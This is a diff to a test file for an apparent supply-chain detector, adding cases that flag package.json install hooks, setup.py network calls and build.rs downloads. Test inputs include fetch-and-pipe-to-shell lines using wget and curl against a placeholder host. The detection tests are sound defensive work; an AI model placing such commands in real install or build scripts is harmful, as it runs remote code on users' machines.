@@ -53,6 +53,20 @@ describe('mitre-attack analyzer', () => {
     expect(scan('package.json', pkg).map((f) => f.ruleId)).toContain('T1195.002-install-hook');
     expect(scan('pkg/package.json', '{ "scripts": { "post' + 'install": "node build.js" } }')).toEqual([]);
     expect(scan('src/x.json', pkg).map((f) => f.ruleId)).not.toContain('T1195.002-install-hook');
+    expect(scan('package.json', '"prep' + 'are": "wg' + 'et -qO- https://x.io/p | sh"').map((f) => f.ruleId)).toContain('T1195.002-install-hook');
+  });
+
+  it('flags setup.py that reaches out, but not one that only builds', () => {
+    expect(scan('setup.py', 'urllib.request.urlop' + 'en("https://x.io/p").read()').map((f) => f.ruleId)).toEqual(['T1195.002-setup-py-network']);
+    expect(scan('pkg/setup.py', 'os.system("cu' + 'rl -s https://x.io | sh")').map((f) => f.ruleId)).toContain('T1195.002-setup-py-network');
+    expect(scan('setup.py', 'subprocess.check_call(["make", "-C", "ext"])')).toEqual([]);
+    expect(scan('src/client.py', 'requests.get(url)')).toEqual([]);
+  });
+
+  it('flags build.rs that downloads or shells out', () => {
+    expect(scan('build.rs', 'Command::new("cu' + 'rl").arg(url)').map((f) => f.ruleId)).toEqual(['T1195.002-build-script']);
+    expect(scan('build.rs', 'let body = reqw' + 'est::blocking::get(url)?;').map((f) => f.ruleId)).toEqual(['T1195.002-build-script']);
+    expect(scan('build.rs', 'cc::Build::new().file("src/x.c").compile("x");')).toEqual([]);
   });
 
   it('reports security findings with technique, location and ATT&CK link', () => {
